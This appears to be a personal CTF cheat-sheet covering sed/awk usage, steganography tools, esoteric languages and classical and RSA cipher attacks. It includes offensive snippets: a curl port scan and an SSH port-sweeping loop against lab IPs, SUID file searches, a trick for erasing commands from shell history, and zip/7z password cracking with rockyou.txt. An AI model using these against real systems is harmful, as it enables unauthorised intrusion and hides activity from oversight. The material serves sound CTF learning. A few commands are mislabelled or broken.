  - Sum the values in the first column and print the total:
    awk '{s+=$1} END {print s}' filename

  - Sum the values in the first column and pretty-print the values and then the total:
    awk '{s+=$1; print $1} END {print "--------"; print s}' filename
```

### Useful Commands

```bash
# List out the second column in the table.
cat text/table.txt | sed 1d | awk '{ print $2 }'

# Sum the columns in the table.
cat text/table.txt | sed 1d | awk '{ sum += $2 } END { print sum }'

# Kills all processes by name.
ps aux | grep chrome | awk '{ print $2 }' | kill
pkill chrome

# Deletes trailing whitespace.
sed 's/\s\+$//g' filename

# Deletes all blank lines from file.
sed '/^$/d' filename

# Insert 'use strict' to the top of every js file.
sed "1i 'use strict';" *.js

# Append a new line at the end of every file.
sed '1a \n' *

# Generate random numbers and then sort.
for i in {1..20}; do echo $(($RANDOM * 777 * $i)); done | sort -n

# Commatize numbers.
sed -r ':loop; s/(.*[0-9])([0-9]{3})/\1,\2/; t loop' text/numbers.txt
```

### Tutorial
Follow the tutorials here:
- http://www.thegeekstuff.com/tag/sed-tips-and-tricks/
- http://www.grymoire.com/Unix/Sed.html
- http://www.grymoire.com/Unix/Awk.html

```bash
# Unzip data.
unzip data.zip

# Zip data.
zip -r data.zip data/

# Preview the files.
head data/names.csv && tail data/names.csv

# Preview csv columns.
sed -n 1p data/colleges.csv | tr ',' '\n'

# Count the number of lines.
wc -l data/*
```

### Sed Print

```sh
# Print contents of a file.
sed -n '/fox/p' text/*
sed -n '/Sysadmin/p' text/geek.txt

# Print lines starting with `3` and skipping by `2`.
sed -n '3~2p' text/geek.txt

# Print the last line.
sed -n '$p' text/geek.txt

# Prints the lines matching the between the two patterns.
sed -n '/Hardware/,/Website/p' text/geek.txt
```

### Sed Print Line Number

```sh
# Prints the line number for all lines in the file.
sed -n '=' filename

# Prints the line number that matches the pattern.
sed -n '/Linux/=' filename

# Prints the line number in range of two patterns (inclusive).
sed -n '/Linux/,/Hardware/=' filename

# Prints the total number of lines.
sed -n '$=' filename
```

### Sed Delete
The `d` command performs a deletion.

```sh
# Deletes the 3rd line from beginning of file.
sed '3d' text/geek.txt

# Delete every lines starting from 3 and skipping by 2.
sed '3~2d' text/geek.txt

# Delete lines from 3 to 5.
sed '3,5d' text/geek.txt

# Delete the last line.
sed '$d' text/geek.txt

# Delete lines matching the pattern.
sed '/Sysadmin/d' text/geek.txt
```

### Sed Substitute
The `s` command performs a substitution.

```sh
# Simple substituion for the first result.
sed 's/Linux/Unix/' text/geek.txt

# Simple substituion for global instances.
sed 's/Linux/Unix/g' text/geek.txt

# Replace nth instance.
sed 's/Linux/Unix/2' text/geek.txt

# Write matched lines to output.
sed -n 's/Linux/Unix/gp' text/geek.txt > text/geek-sub.txt

# Use regex group for capturing additional patterns (up to 9).
sed 's/\(Linux\).\+/\1/g' text/geek.txt
sed -r 's/(Linux).+/\1/g' text/geek.txt

# Remove the last word.
sed -r 's/\d$//g' text/geek.txt

# Remove all letters.
sed -r 's/[a-zA-Z]//g' text/geek.txt

# Remove html tags (WIP).
sed -r 's|(</?[a-z]+>)||g' text/html.txt

# Commatize any number.
sed ':a;s/\B[0-9]\{3\}\>/,&/;ta' text/numbers.txt
sed -r ':loop; s/\B[0-9]{3}\>/,&/; t loop' text/numbers.txt
```

### Sed Transform
The `y` command performs a transformation.

```sh
# Converts all lowercase chars to uppercase.
sed 'y/abcdefghijklmnopqrstuvwxyz/ABCDEFGHIJKLMNOPQRSTUVWXYZ/' text/geek.txt

# Converts all uppercase chars to lowercase.
sed 'y/ABCDEFGHIJKLMNOPQRSTUVWXYZ/abcdefghijklmnopqrstuvwxyz/' text/geek.txt

# Perform a two character shift.
sed 'y/abcdefghijklmnopqrstuvwxyz/cdefghijklmnopqrstuvwxyzab/' text/geek.txt
```

### Sed Multiple Commands
The `-e` flag allows for multiple commands.

```sh
sed -r -e 's/etc\.*//g' -e 's/(\s+)(\))/\2/g' text/geek.txt
```

---

### Read file contents

```bash
cat *
cat file.txt
more file.txt
head file.txt
tail file.txt
echo < file.txt
grep . file.txt
while read line; do echo $line; done < file.txt
```

### Bash port scanner
> John Hammond
```bash
curl http://10.10.10.1:[30000-60000]
```

### SSH Spam
```bash
for port in {9000..13000}
do 
	print "$port"
	ssh -o StrictHostKeyChecking=no 
	-p $port 10.10.245.88
done
```

### Find SUID files
```bash
find "$DIRECTORY" -perm /4000     # SUID
find "$DIRECTORY" -perm /u=s      # SUID
find "$DIRECTORY" -perm /2000     # SGID
find "$DIRECTORY" -perm /g=s      # SGID
find "$DIRECTORY" -perm /6000     # SGID + SUID
find "$DIRECTORY" -perm /u=s,g=s  # SGID + SUID
```

### Execute command without keeping it in history
```bash
<your_secret_command>; history -d $((HISTCMD-1))
<your_secret_command>; history -d $(history 1)
```


### Tee and less -r
```php
./linpeas.sh | tee lin.log
```

```php
less -r lin.log
```

# Steg

## Steghide Basics

Steghide operates with the following basic syntax:

```
steghide [command] [options] -ef [cover_file] -cf [embed_file]
```

- `[command]` represents the operation you want to perform, such as “embed” or “extract.”
- `[options]` include any additional settings or parameters.
- `[cover_file]` is the file you’re embedding data into, usually an image.
- `[embed_file]` is the file that contains the data you want to hide.

Here are the common commands used in `steghide`:

- `embed`: This command allows you to hide data within a cover file.
- `extract`: Use this command to extract hidden data from a cover file.
- `info`: Get information about the embedded data within a cover file.

Now, let’s explore a basic example of hiding and extracting data with `steghide`.

### Example: Hiding and Extracting Data with Steghide

For this example, we’ll assume you have an image file named `cover.jpg` and a text file named `secret.txt` that you want to hide within the image.

**Hiding Data**:

To embed the text file within the image, use the `embed` command like this:

```
steghide embed -ef secret.txt -cf cover.jpg
```

You’ll be prompted to create a passphrase to protect the embedded data. Make sure to remember this passphrase; you’ll need it to extract the hidden information.

**Extracting Data**:

To retrieve the hidden data from the image, use the `extract` command:

```
steghide extract -sf cover.jpg
```

You’ll be prompted to enter the passphrase you set during the embedding process. If the passphrase is correct, `steghide` will extract the data and save it as `secret.txt`.

Now, you understand the basic usage of `steghide`. In CTFs, you’ll face challenges where the flag or other vital information is hidden using steganography techniques. Let’s dive into using `steghide` to tackle these challenges effectively.

### Practical Steghide in CTFs

Steghide is a powerful tool for CTF participants, and knowing how to use it can be the key to uncovering hidden flags. Here’s a step-by-step approach to solving steganography challenges with `steghide`:

### 1. Examine the Image

The first step is to carefully examine the image file given in the CTF challenge. Look for any subtle irregularities or patterns that might suggest the presence of hidden data. Pay attention to color variations, small details, and anything that seems out of place.

### 2. Identify the Image Format

Determine the image format (e.g., JPEG, PNG) as it will guide your choice of steganography tool. If you suspect the image contains hidden data, use `steghide` specifically designed for image formats.

### 3. Run steghide info

Before attempting to extract data, use the `steghide info` command to get information about the image. This can provide valuable insights into whether there’s hidden data and if a passphrase is required. For example:

```
steghide info cover.jpg
```

_The output will show if any data is embedded and whether a passphrase is necessary._

### 4. Extract Data

If the `steghide info` command reveals that data is embedded, proceed to extract it using the `steghide extract` command. Enter the passphrase when prompted, and if successful, the hidden data will be extracted.

### 5. Analyze Extracted Data

Examine the extracted data carefully. It may contain the flag you’re searching for, or it could provide further clues to solve the challenge. Remember that the extracted data may not always be in plain text and might require additional decryption or decoding.

### 6. Password Brute-Force

In some cases, you may not have the passphrase required to extract data. If you strongly suspect steganography, consider attempting a brute-force attack to guess the passphrase. There are tools available for automated brute-forcing, but be aware that this can be time-consuming.

### 7. Collaborate and Document

If you’re working as part of a CTF team, collaborate with your teammates. Share your findings, hypotheses, and progress. Effective teamwork can lead to more efficient problem-solving.

Also, document your progress and findings. Most CTFs require participants to submit a write-up explaining how they solved each challenge. Clear documentation can help you remember the steps you took and provide a solid basis for your write-up.


---

### Esoteric Languages

[https://tio.run/](https://tio.run/)

An online tool that has a ton of Esoteric language interpreters. 

* Brainfuck

	This language is easily detectable by its huge use of plus signs, braces, and arrows. 	There are plenty of online interpreters, like this one: [https://copy.sh/brainfuck/](https://copy.sh/brainfuck/) Some example code:

```php
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++++++++++++++.--.--------------.+++++++++++++.----.-----------
--.++++++++++++.--------.<------------.<++.>>----.+.<+++++++++++.+++++++++++++.>+++++++++++++++++.-------------
--.++++.+++++++++++++++.<<.>>-------.<+++++++++++++++.>+++..++++.--------.+++.<+++.<++++++++++++++++++++++++++
.<++++++++++++++++++++++.>++++++++++++++..>+.----.>------.+++++++.--------.<+++.>++++++++++++..-------.++.
```

* [Malboge]

	An esoteric language that looks a lot like Base85... but isn't. Often has references to "Inferno" or "Hell" or "Dante." Online interpreters like so: [http://www.malbolge.doleczek.pl/](http://www.malbolge.doleczek.pl/) Example code:

```
(=<`#9]~6ZY32Vx/4Rs+0No-&Jk)"Fh}|Bcy?`=*z]Kw%oG4UUS0/@-ejc(:'8dc
```

* [Piet]

	A graphical programming language... looks like large 8-bit pixels in a variety of colors. Can be interpreted with the tool [`npiet`][npiet]

![https://www.bertnase.de/npiet/hi.png](https://www.bertnase.de/npiet/hi.png)


* [Ook!](http://esolangs.org/wiki/ook!)

	A joke language. Recognizable by `.` and `?`, and `!`.
	
* Hexahue Cipher

![](https://miro.medium.com/max/465/1*QY8sg087QQwXOoS3Cu1cWg.jpeg)


https://www.dcode.fr/hexahue-cipher
```
Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook! Ook! Ook? Ook! Ook? Ook.
Ook! Ook. Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.
Ook. Ook. Ook! Ook? Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook?
Ook! Ook! Ook? Ook! Ook? Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook.
```

Steganography
---------------------

* [StegCracker][StegCracker]

	Don't ever forget about [`steghide`][steghide]! This tool can use a password list like `rockyou.txt` with steghide. SOME IMAGES CAN HAVE MULTIPLE FILED ENCODED WITH MULTIPLE PASSWORDS.

* [`steg_brute.py`](https://github.com/Va5c0/Steghide-Brute-Force-Tool)

	This is similar to `stegcracker` above.

* [`openstego`][OpenStego]

	A [Java][Java] [`.JAR`][JAR] tool, that can extract data from an image. A good tool to use on guessing challenges, when you don't have any other leads. We found this tool after the [Misc50](http://0xahmed.ninja/nullcon-hackim18-ctf-writeups/) challenge from [HackIM 2018](https://ctftime.org/event/566)

* [`Stegsolve.jar`][Stegsolve.jar]

	A [Java][Java] [`.JAR`][JAR] tool, that will open an image and let you as the user arrow through different renditions of the image (viewing color channels, inverted colors, and more). The tool is surprisingly useful.

* [`steghide`][steghide]

	A command-line tool typically used alongside a password or key, that could be uncovered some other way when solving a challenge. 

* [`zsteg`][zsteg]

	Command-line tool for use against Least Significant Bit steganography... unfortunately only works against PNG and BMP images.

* [`jsteg`][jsteg]

    Another command-line tool to use against JPEG images. [https://github.com/lukechampine/jsteg](https://github.com/lukechampine/jsteg) Handy for Hackerrank Codefest CTF 2018.

* [Jstego][Jstego]

    A GUI tool for JPG steganography. [https://sourceforge.net/projects/jstego/](https://sourceforge.net/projects/jstego/) It is a [Java][Java] [JAR] file similar to stegsolve.jar

* Morse Code

	Always test for this if you are seeing two distinct values... _it may not always be binary!_ Online decoders like so: [https://morsecode.scphillips.com/translator.html](https://morsecode.scphillips.com/translator.html) 	

* Whitespace

	Tabs and spaces could be representing 1's and 0's and treating them as a binary message... or, they could be whitespace done with [`snow`][snow] or an esoteric programming language interpreter: [https://tio.run/#whitespace](https://tio.run/#whitespace)

* DNA Codes

    When given a sequence with only A, C, G, T , there is an online mapping for these. Try this:

* [`snow`][snow]

	A command-line tool for whitespace steganography (see above).

* SONIC Visualizer (audio spectrum)

	Some classic challenges use an audio file to hide a flag or other sensitive stuff. SONIC visualizer easily shows you [spectrogram](https://en.wikipedia.org/wiki/Spectrogram). __If it sounds like there is random bleeps and bloops in the sound, try this tactic!__

* [Detect DTMF Tones]

	Audio frequencies common to a phone button, DTMF: [https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling](https://en.wikipedia.org/wiki/Dual-tone_multi-frequency_signaling).

* Phone-Keypad

	Some messages may be hidden with a string of numbers, but really be encoded with old cell-phone keypads, like text messaging with numbers repeated:

![https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQSySxHjMFv80XWp74LZpfrnAro6a1MLqeF1F3zpguA5PGSW9ov)

* [`hipshot`][hipshot]

	A [Python] module to compress a video into a single standalone image, simulating a long-exposure photograph. Was used to steal a [QR code] visible in a video, displayed through "Star Wars" style text motion.	

* [QR code]

	A small square "barcode" image that holds data.

* [`zbarimg`][zbarimg]

	A command-line tool to quickly scan multiple forms of barcodes, [QR codes] included. Installed like so on a typical [Ubuntu] image: 

```
sudo apt install zbar-tools
```
	
* Punctuation marks `!`, `.` and `?`

	I have seen some challenges use just the end of `.` or `?` or `!` to represent the [Ook](http://esolangs.org/wiki/ook!) esoteric programming language. Don't forget that is a thing!

---

### General Overview for Steg

1. Usually when organizer gave us Image, Music, Video, Zip, EXE, File System, PDF and other files, it a _steganography_ or _forensics_ challenge. Run `file` command first.
    
2. Metadata is important. Checkout the EXIF data of the file by using `exiftool [filename]` command.
    
3. Try issuing `binwalk [filename]` on the file. They may hide another file in the file.
    
    - To extract, use `binwalk -e`.
        
    - To extract one specific signature type, use `binwalk -D 'png image:png' [filename]`.
        
    - To extract all files, run `binwalk --dd='.*' [filename]`.
        
    
4. Try file carve using `foremost -v [filename]` command. Foremost support all files.
    
**Images**

1. View the image first
    
2. Use `strings` command to that file.
    
    - Try `grep -i [any strings you want to filter]` from the `strings` command output.
        
    - Example `grep -i "flag{"` to filtering the flag format only. `-i` option to unable case sensitive.

3. Google the images, differentiate the `md5hash`. If you found same image but have a different md5 hash, it may probably have been altered.
    
4. Analyse the header and the content of the file using any **hex editor**.
    
5. Know the **file signature**. Maybe they gave us corrupt header! So fix it!
    
6. Maybe **zoom-in** and **zoom-out** method can get the flag.
    
7. Use [https://www.tineye.com/](https://www.tineye.com/) to reverse search the image in the internet.
    
8. Use `imagemagick` command tool to do image manipulation.
    
9. Use **Stegsolve.jar** tools. There are so many CTF I've participated that I used this tool to unhide flag from an image.
    
10. File carve using `steghide --extract -sf <filename>`. Try find the password with your own-self. Maybe, the organizer will give hints or the password may in another file.
    
11. Check for any corruption on PNG file by using `pngcheck <filename.png>` command.
    
12. Detect stegano-hidden data in PNG & BMP s by `issuing zsteg -a <filename.png>`.
    
13. Use **SmartDeblur** software to fix blurry on image.
    
14. Use `stegcracker <filename> <wordlist>` tools Steganography brute-force password utility to uncover hidden data inside files.
    
15. Use `tesseract` to scan text in image and convert it to .txt file.
    
16. Another powerfool tool is called `zsteg`.
    
17. Steganosuite
    
    - Extract data from image (-x)

18. Some of online stegano decoder :-
    
    - [https://futureboy.us/stegano/decinput.html](https://futureboy.us/stegano/decinput.html)
        
    - [http://stylesuxx.github.io/steganography/](http://stylesuxx.github.io/steganography/)
        
    - [https://www.mobilefish.com/services/steganography/steganography.php](https://www.mobilefish.com/services/steganography/steganography.php)
        
    - [https://manytools.org/hacker-tools/steganography-encode-text-into-image/](https://manytools.org/hacker-tools/steganography-encode-text-into-image/)
        
    - [https://steganosaur.us/dissertation/tools/image](https://steganosaur.us/dissertation/tools/image)
        
    - [https://georgeom.net/StegOnline](https://georgeom.net/StegOnline)
        
    - [http://magiceye.ecksdee.co.uk/](http://magiceye.ecksdee.co.uk/)

**Compressed file**

1. Unzip it.
    
    1. Use `zipdetails -v` command to display details about the internal structure of a Zip file.
        
    2. Use `zipinfo` command to know details info about Zip file.
        
    3. Use `zip -FF input.zip --out output.zip` attempt to repair a corrupted zip file.
        
    4. Brute-force the zip password using `fcrackzip -D -u -p rockyou.txt filename.zip`
        
2. To crack 7z run `7z2hashcat32-1.3.exe filename.7z`. Then `john --wordlist=/usr/share/wordlists/rockyou.txt hash`
    

**Music file**

1. Use `binwalk` first. They may embedded something in the file.
    
2. Use **Audacity**.
    
3. Use **Sonic Visualizer**. Look at spectogram and other few Pane.
    
4. Use **Deepsound**.
    
5. Use **SilentEye**.
    
6. Some of online stegano decoder for music:-
    
    - [https://steganosaur.us/dissertation/tools/audio](https://steganosaur.us/dissertation/tools/audio)

**Text**

1. Use [http://www.spammimic.com/](http://www.spammimic.com/) that can decode hide message in spam text.

**PDF**

1. qpdf
    
2. PDFStreamdumper
    
3. pdfinfo
    
4. pdfcrack
    
5. pdfimages
    
6. pdfdetach
    
7. pdf-parser.py -v `<file>`
    
8. pdftotext
    
9. peepdf -if `<filename>`
    
    - object `<value>`

10. pdfid

---
### Cryptography

You will encounter a wide variety of cryptographic techniques in CTFs, but some fruit hangs lower than others, and I am trying to build some reusable modules to aid us.

A few ciphers I've encountered so far:

- Caesar (`scripts/examples/crypto/caesar.rb`)
- Vigenère
- Scytale transposition cipher
- Substitution cipher

---
### Steganography

- Look for extra data hidden in the "unused" areas of the file.
### Images

1. Anything in the exif metadata?
2. What file format is it? Different image formats provide different avenues for hiding data.
3. Does playing about with levels/curves reveal the flag?
4. Is the flag hidden in only one of the colour channels?

---

### Crypto Examples

```php
#!/usr/bin/env ruby
require_relative "../../lib/crypto/caesar.rb"

# Example
ciphertext = "MABL BL TG XQTFIEX HY MAX LEHMADKXP VTXLTK VBIAXK UKXTDXK'L KTP IHPXK!"

puts "[+] dumb caesar example"
Caesar.dumb_caesar(ciphertext)

puts "\n[+] smart caesar example"
Caesar.smart_caesar(ciphertext)
```

### Cryptography


- Keyboard Shift
    
    [https://www.dcode.fr/keyboard-shift-cipher](https://www.dcode.fr/keyboard-shift-cipher) If you see any thing that has the shape of a sentence but it looks like nonsense letters, and notes some shift left or right, it may be a keyboard shift...
    
- Bit Shift
    
    Sometimes the letters may be shifted by a stated hint, like a binary bit shift ( x >> 1 ) or ( x << 1 ).
    
- Reversed Text
    
    Sometimes a "ciphertext" is just as easy as reversed text. Don't forgot to check under this rock! You can reverse a string in [Python](https://www.python.org/) like so:
    

```
"UOYMORFEDIHOTGNIYRTEBTHGIMFTCATAHTTERCESASISIHT"[::-1]
```

- XOR
    
    ANY text could be XOR'd. Techniques for this are Trey's code, and XORing the data against the known flag format. Typically it is given in just hex, but once it is decoded into raw binary data, it gives it keeps it's hex form (as in `\xde\xad\xbe\xef` etc..) Note that you can do easy XOR locally with Python like so (you need `pwntools` installed):
    
```python
python >>> import pwn; pwn.xor("KEY", "RAW_BINARY_CIPHER")
```
    

Caesar Cipher

The most classic shift cipher. Tons of online tools like this: [https://www.dcode.fr/caesar-cipher](https://www.dcode.fr/caesar-cipher) or use `caesar` as a command-line tool (`sudo apt install bsdgames`) and you can supply a key for it. Here's a one liner to try all letter positions:

```python
 cipher='jeoi{geiwev_gmtliv_ws_svmkmrep}' ; for i in {0..25}; do echo $cipher | caesar $i; done
```

- **Be aware!** Some challenges include punctuation in their shift! If this is the case, try to a shift within all 255 ASCII characters, not just 26 alphabetical letters!
    
- `caesar`
    
    A command-line caesar cipher tool (noted above) found in the `bsdgames` package.
    
- [Atbash Cipher](https://en.wikipedia.org/wiki/Atbash)
    
    If you have some text that you have no idea what it is, try the [Atbash cipher](https://en.wikipedia.org/wiki/Atbash)! It's a letter mapping, but the alphabet is reversed: like `A` maps to `Z`, `B` maps to `Y` and so on. There are tons of online tools to do this ([http://rumkin.com/tools/cipher/atbash.php](http://rumkin.com/tools/cipher/atbash.php)), and you can build it with [Python](https://www.python.org/).
    
- [Vigenere Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher)
    
    [http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx](http://www.mygeocachingprofile.com/codebreaker.vigenerecipher.aspx), [https://www.guballa.de/vigenere-solver](https://www.guballa.de/vigenere-solver) and personal Python code here: [https://pastebin.com/2Vr29g6J](https://pastebin.com/2Vr29g6J)
    
- Beaufourt Cipher
    
    [https://www.dcode.fr/beaufort-cipher](https://www.dcode.fr/beaufort-cipher)
    
- Python random module cracker/predictor
    
    [https://github.com/tna0y/Python-random-module-cracker](https://github.com/tna0y/Python-random-module-cracker)... helps attack the Mersenne Twister used in Python's random module.
    
- Transposition Cipher
    
- RSA: Classic RSA
    
    Variables typically given: `n`, `c`, `e`. _ALWAYS_ try and give to [http://factordb.com](http://factordb.com). If `p` and `q` are able to be determined, use some RSA decryptor; handmade code available here: [https://pastebin.com/ERAMhJ1v](https://pastebin.com/ERAMhJ1v)
    
- RSA: Multi-prime RSA
    
- RSA: `e` is 3 (or small)
    
    If `e` is 3, you can try the cubed-root attack. If you the cubed root of `c`, and if that is smaller than the cubed root of `n`, then your plaintext message `m` is just the cubed root of `c`! Here is [Python](https://www.python.org/) code to take the cubed root:
    

```
def root3rd(x):
    y, y1 = None, 2
    while y!=y1:
        y = y1
        y3 = y**3
        d = (2*y3+x)
        y1 = (y*(y3+2*x)+d//2)//d
    return y 
```

- RSA: Weiner's Little D Attack
    
    The telltale sign for this kind of challenge is an enormously large `e` value. Typically `e` is either 65537 (0x10001) or `3` (like for a Chinese Remainder Theorem challenge). Some stolen code available here: [https://pastebin.com/VKjYsDqD](https://pastebin.com/VKjYsDqD)
    
- RSA: Chinese Remainder Attack
    
    These challenges can be spotted when given mutiple `c` cipher texts and multiple `n` moduli. `e` must be the same number of given `c` and `n` pairs. Some handmade code here: [https://pastebin.com/qypwc6wH](https://pastebin.com/qypwc6wH)
    
- [LC4](https://www.schneier.com/blog/archives/2018/05/lc4_another_pen.html)
    
    This is an adaptation of RC4... just not. There is an implementation available in Python. [https://github.com/dstein64/LC4/blob/master/documentation.md](https://github.com/dstein64/LC4/blob/master/documentation.md)
    
- Elgamal
    
- Affine Cipher
    
- Substitution Cipher (use quip quip!)
    
    [https://quipqiup.com/](https://quipqiup.com/)
    
- Railfence Cipher
    
    [http://rumkin.com/tools/cipher/railfence.php](http://rumkin.com/tools/cipher/railfence.php)
    
- [Playfair Cipher](https://en.wikipedia.org/wiki/Playfair_cipher)
    
    racker: [http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html](http://bionsgadgets.appspot.com/ww_forms/playfair_ph_web_worker3.html)
    
- Polybius Square
    
    [https://www.braingle.com/brainteasers/codes/polybius.php](https://www.braingle.com/brainteasers/codes/polybius.php)
    
- The Engima
    
    [http://enigma.louisedade.co.uk/enigma.html](http://enigma.louisedade.co.uk/enigma.html), [https://www.dcode.fr/enigma-machine-cipher](https://www.dcode.fr/enigma-machine-cipher)
    
- AES ECB
    
    The "blind SQL" of cryptography... leak the flag out by testing for characters just one byte away from the block length.
    
- Two-Time Pad


